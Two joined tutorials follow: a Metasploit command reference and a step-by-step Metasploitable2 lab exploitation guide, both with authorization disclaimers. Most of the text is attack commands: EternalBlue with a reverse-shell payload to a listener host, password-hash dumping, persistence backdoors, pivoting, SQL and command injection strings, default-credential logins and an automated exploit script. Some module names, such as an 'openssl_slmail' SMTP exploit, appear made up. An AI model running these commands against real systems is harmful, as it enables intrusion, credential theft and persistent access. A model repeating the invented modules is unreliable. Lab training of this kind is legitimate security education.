# Metasploit Framework - Comprehensive Guide

Metasploit is a powerful penetration testing framework used for security testing, vulnerability assessment, and ethical hacking. Here's a detailed guide:

## Starting Metasploit

### 1. Launch Metasploit Console
```bash
# Start the main console
msfconsole

# Start with specific database
msfconsole -d

# Start with custom resource script
msfconsole -r script.rc

# Quiet mode (no banner)
msfconsole -q
```

### 2. Database Setup
```bash
# Check database status
db_status

# Initialize database
msfdb init

# Connect to database
db_connect

# Rebuild cache
db_rebuild_cache
```

## Core Metasploit Components

### 1. Exploits
```bash
# Search for exploits
search type:exploit platform:windows

# Show exploit information
info exploit/windows/smb/ms17_010_eternalblue

# Use an exploit
use exploit/windows/smb/ms17_010_eternalblue

# Show exploit options
show options

# Set exploit options
set RHOSTS 192.168.1.100
set RPORT 445
```

### 2. Payloads
```bash
# Show available payloads
show payloads

# Show compatible payloads for current exploit
show payloads

# Set payload
set payload windows/x64/meterpreter/reverse_tcp

# Show payload options
show options

# Set payload options
set LHOST 192.168.1.10
set LPORT 4444
```

### 3. Auxiliary Modules
```bash
# Search auxiliary modules
search type:auxiliary

# Port scanners
use auxiliary/scanner/portscan/tcp
set RHOSTS 192.168.1.0/24
set PORTS 1-1000
run

# SMB scanner
use auxiliary/scanner/smb/smb_version
set RHOSTS 192.168.1.0/24
run

# HTTP directory scanner
use auxiliary/scanner/http/dir_scanner
set RHOSTS 192.168.1.100
run
```

## Common Metasploit Commands

### Navigation and Information
```bash
# Show help
help
?

# Show current module info
info

# Show module options
show options

# Show advanced options
show advanced

# Show payloads
show payloads

# Show targets
show targets

# Back to previous context
back

# Exit Metasploit
exit
quit
```

### Search and Selection
```bash
# Search modules
search [keyword]
search type:exploit platform:linux
search cve:2017 rank:excellent
search author:rapid7

# Use a module
use [module_path]
use exploit/multi/handler

# Show module details
info [module_path]
```

### Setting Options
```bash
# Set option
set [OPTION] [VALUE]
set RHOSTS 192.168.1.100
set LHOST 192.168.1.10

# Unset option
unset [OPTION]
unset RHOSTS

# Set global option
setg [OPTION] [VALUE]
setg RHOSTS 192.168.1.0/24

# Show current settings
show options
show advanced
```

## Exploit Development Workflow

### 1. Target Discovery
```bash
# Nmap scan from within Metasploit
db_nmap -sS -A 192.168.1.0/24

# Import nmap results
db_import scan_results.xml

# Show discovered hosts
hosts

# Show discovered services
services
```

### 2. Vulnerability Identification
```bash
# Search for specific vulnerability
search cve:2017-0144

# Check if target is vulnerable
use auxiliary/scanner/smb/smb_ms17_010
set RHOSTS 192.168.1.100
run
```

### 3. Exploit Selection and Configuration
```bash
# Select exploit
use exploit/windows/smb/ms17_010_eternalblue

# Show targets
show targets

# Set target (if needed)
set target 0

# Configure exploit
set RHOSTS 192.168.1.100
```

### 4. Payload Selection
```bash
# Show compatible payloads
show payloads

# Select payload
set payload windows/x64/meterpreter/reverse_tcp

# Configure payload
set LHOST 192.168.1.10
set LPORT 4444
```

### 5. Execution
```bash
# Check configuration
show options

# Run the exploit
exploit
run

# Run in background
exploit -j
```

## Meterpreter Commands

### System Information
```bash
# System info
sysinfo

# Get user info
getuid

# Get privileges
getprivs

# Process list
ps

# Environment variables
getenv
```

### File System Operations
```bash
# Change directory
cd C:\\

# List directory
ls
dir

# Print working directory
pwd
getwd

# Download file
download C:\\file.txt /tmp/

# Upload file
upload /tmp/file.txt C:\\

# Search files
search -f *.txt -d C:\\
```

### Network Operations
```bash
# Network configuration
ipconfig
ifconfig

# Routing table
route

# Network connections
netstat

# ARP table
arp
```

### Process and Service Management
```bash
# Kill process
kill [PID]

# Execute command
execute -f cmd.exe -i -H

# Get system shell
shell

# Migrate to process
migrate [PID]

# Get system privileges
getsystem
```

## Advanced Metasploit Features

### 1. Post-Exploitation Modules
```bash
# Search post modules
search type:post

# Gather system info
use post/windows/gather/enum_system
set SESSION 1
run

# Dump password hashes
use post/windows/gather/hashdump
set SESSION 1
run

# Privilege escalation
use post/windows/escalate/getsystem
set SESSION 1
run
```

### 2. Persistence
```bash
# Create persistent backdoor
use exploit/windows/local/persistence
set SESSION 1
run

# Registry persistence
use post/windows/manage/persistence_exe
set SESSION 1
run
```

### 3. Pivoting
```bash
# Add route through compromised host
route add 10.1.1.0/24 1

# Use socks proxy
use auxiliary/server/socks4a
set SRVHOST 127.0.0.1
set SRVPORT 1080
run -j

# Port forwarding
portfwd add -l 8080 -p 80 -r 10.1.1.100
```

## Resource Scripts

### Create automation scripts
```bash
# Create resource script (commands.rc)
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST 192.168.1.10
set LPORT 4444
exploit -j

# Run resource script
msfconsole -r commands.rc
```

## Database Operations

### Managing scan data
```bash
# Show hosts
hosts

# Show services
services

# Show vulnerabilities
vulns

# Show credentials
creds

# Export data
db_export -f xml output.xml
```

## Best Practices

### 1. Reconnaissance First
```bash
# Always start with reconnaissance
db_nmap -sS -sV -O target_range
use auxiliary/scanner/discovery/udp_sweep
```

### 2. Verify Exploits
```bash
# Check exploit reliability
info exploit_name
# Look for rank: excellent, great, good

# Test with check command
check
```

### 3. Session Management
```bash
# List active sessions
sessions -l

# Interact with session
sessions -i 1

# Background session
background

# Kill session
sessions -k 1
```

### 4. Cleanup
```bash
# Clean up artifacts
use post/multi/manage/system_session_cleanup
set SESSION 1
run
```

## Example Attack Scenario

```bash
# 1. Reconnaissance
db_nmap -sS -sV 192.168.1.100

# 2. Vulnerability scanning
use auxiliary/scanner/smb/smb_ms17_010
set RHOSTS 192.168.1.100
run

# 3. Exploitation
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 192.168.1.100
set payload windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.1.10
exploit

# 4. Post-exploitation
sysinfo
getuid
getsystem
hashdump

# 5. Persistence
use post/windows/manage/persistence_exe
set SESSION 1
run
```

**Important**: Always use Metasploit ethically and only on systems you own or have explicit permission to test. This tool should be used for legitimate security testing, research, and educational purposes only.


# Metasploitable2 Vulnerabilities Guide

Metasploitable2 is an intentionally vulnerable Linux system designed for security training. Here are the major vulnerabilities you can exploit:

## Initial Reconnaissance

```bash
# Scan all ports
nmap -sS -sV -O 172.21.0.3

# Comprehensive scan with scripts
nmap -sC -sV -A 172.21.0.3

# Scan for specific vulnerabilities
nmap --script vuln 172.21.0.3
```

## Major Vulnerabilities by Service

### 1. SSH (Port 22) - Weak Credentials
```bash
# Default credentials
ssh msfadmin@172.21.0.3
# Password: msfadmin

# Using Metasploit
use auxiliary/scanner/ssh/ssh_login
set RHOSTS 172.21.0.3
set USERNAME msfadmin
set PASSWORD msfadmin
run
```

### 2. FTP (Port 21) - vsftpd 2.3.4 Backdoor
```bash
# Using Metasploit
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS 172.21.0.3
exploit

# Manual exploitation
ftp 172.21.0.3
# Username: user:)
# This triggers the backdoor on port 6200
```

### 3. Telnet (Port 23) - Weak Credentials
```bash
# Connect with telnet
telnet 172.21.0.3

# Try credentials:
# msfadmin:msfadmin
# user:user

# Metasploit brute force
use auxiliary/scanner/telnet/telnet_login
set RHOSTS 172.21.0.3
run
```

### 4. SMTP (Port 25) - OpenSSL Heap Overflow
```bash
# Using Metasploit
use exploit/unix/smtp/openssl_slmail
set RHOSTS 172.21.0.3
set payload generic/shell_bind_tcp
exploit
```

### 5. HTTP (Port 80) - Multiple Web Vulnerabilities

#### Directory Traversal
```bash
# Manual testing
curl "http://172.21.0.3/dvwa/../../../etc/passwd"
curl "http://172.21.0.3/mutillidae/index.php?page=../../../../etc/passwd"

# Using dirb
dirb http://172.21.0.3

# Using gobuster
gobuster dir -u http://172.21.0.3 -w /usr/share/wordlists/dirb/common.txt
```

#### SQL Injection (DVWA/Mutillidae)
```bash
# Using SQLMap
sqlmap -u "http://172.21.0.3/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie="PHPSESSID=your_session; security=low" --dbs

# Manual SQL injection
curl "http://172.21.0.3/dvwa/vulnerabilities/sqli/?id=1' OR '1'='1&Submit=Submit"
```

#### Command Injection
```bash
# DVWA command injection
curl "http://172.21.0.3/dvwa/vulnerabilities/exec/?ip=127.0.0.1;cat /etc/passwd&Submit=Submit"
```

### 6. NetBIOS (Port 139) - Samba Vulnerabilities
```bash
# Enumerate shares
smbclient -L 172.21.0.3 -N

# Connect to shares
smbclient //172.21.0.3/tmp -N

# Using enum4linux
enum4linux 172.21.0.3

# Metasploit Samba usermap script
use exploit/multi/samba/usermap_script
set RHOSTS 172.21.0.3
exploit
```

### 7. SNMP (Port 161) - Default Community Strings
```bash
# Enumerate with snmpwalk
snmpwalk -c public -v1 172.21.0.3

# Metasploit SNMP enumeration
use auxiliary/scanner/snmp/snmp_enum
set RHOSTS 172.21.0.3
run

# Try different community strings
snmpwalk -c private -v1 172.21.0.3
```

### 8. HTTPS (Port 443) - SSL/TLS Issues
```bash
# Test SSL vulnerabilities
nmap --script ssl-enum-ciphers -p 443 172.21.0.3
nmap --script ssl-heartbleed -p 443 172.21.0.3

# SSLyze (if available)
sslyze 172.21.0.3:443
```

### 9. SMB (Port 445) - Multiple Vulnerabilities
```bash
# SMB version scanning
nmap --script smb-protocols 172.21.0.3

# SMB vulnerabilities
nmap --script smb-vuln-* 172.21.0.3

# Metasploit SMB exploits
use exploit/linux/samba/lsa_transnames_heap
set RHOSTS 172.21.0.3
exploit
```

### 10. MySQL (Port 3306) - Weak Authentication
```bash
# Connect with empty password
mysql -h 172.21.0.3 -u root

# Metasploit MySQL login
use auxiliary/scanner/mysql/mysql_login
set RHOSTS 172.21.0.3
set USERNAME root
set BLANK_PASSWORDS true
run

# MySQL enumeration
use auxiliary/admin/mysql/mysql_enum
set RHOSTS 172.21.0.3
set USERNAME root
set PASSWORD ""
run
```

### 11. PostgreSQL (Port 5432) - Authentication Issues
```bash
# Connect to PostgreSQL
psql -h 172.21.0.3 -U postgres

# Metasploit PostgreSQL login
use auxiliary/scanner/postgres/postgres_login
set RHOSTS 172.21.0.3
run
```

### 12. VNC (Port 5900) - Weak/No Password
```bash
# Connect to VNC
vncviewer 172.21.0.3:5900

# Metasploit VNC login
use auxiliary/scanner/vnc/vnc_login
set RHOSTS 172.21.0.3
run
```

## Complete Exploitation Workflow

### Phase 1: Reconnaissance
```bash
# Network discovery
nmap -sn 172.21.0.0/24

# Port scanning
nmap -sS -sV -A 172.21.0.3

# Service enumeration
nmap --script=default,discovery 172.21.0.3
```

### Phase 2: Vulnerability Assessment
```bash
# Vulnerability scanning
nmap --script vuln 172.21.0.3

# Web application scanning
nikto -h http://172.21.0.3
dirb http://172.21.0.3

# Service-specific scans
enum4linux 172.21.0.3
```

### Phase 3: Exploitation Examples

#### Easy Win - SSH Access
```bash
ssh msfadmin@172.21.0.3
# Password: msfadmin
# You now have shell access
```

#### Web Exploitation - Command Injection
```bash
# Access DVWA
# Navigate to: http://172.21.0.3/dvwa/
# Login: admin/password
# Go to Command Injection
# Input: 127.0.0.1; cat /etc/passwd
```

#### Database Exploitation
```bash
mysql -h 172.21.0.3 -u root
# No password required
# You can now access all databases
```

## Advanced Exploitation Scripts

### Automated Metasploit Script
```bash
# Create resource script
cat > metasploitable_auto.rc << EOF
use auxiliary/scanner/portscan/tcp
set RHOSTS 172.21.0.3
run

use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS 172.21.0.3
exploit -j

use exploit/multi/samba/usermap_script
set RHOSTS 172.21.0.3
exploit -j

use auxiliary/scanner/mysql/mysql_login
set RHOSTS 172.21.0.3
set BLANK_PASSWORDS true
run
EOF

# Run the script
msfconsole -r metasploitable_auto.rc
```

### Complete Enumeration Script
```bash
#!/bin/bash
TARGET=172.21.0.3

echo "=== Metasploitable2 Enumeration ==="
echo "Target: $TARGET"

echo "=== Port Scan ==="
nmap -sS -sV $TARGET

echo "=== Web Directories ==="
dirb http://$TARGET

echo "=== SMB Enumeration ==="
enum4linux $TARGET

echo "=== SNMP Enumeration ==="
snmpwalk -c public -v1 $TARGET

echo "=== MySQL Test ==="
mysql -h $TARGET -u root -e "SHOW DATABASES;"
```

## Key Points for Learning

1. **Always start with reconnaissance** - Know your target
2. **Low-hanging fruit first** - Try default credentials
3. **Web applications** - Usually have multiple vulnerabilities
4. **Network services** - Often misconfigured
5. **Privilege escalation** - Once you have access, escalate privileges

**Remember**: Metasploitable2 is designed to be vulnerable. These techniques should only be used in authorized testing environments or your own lab setup.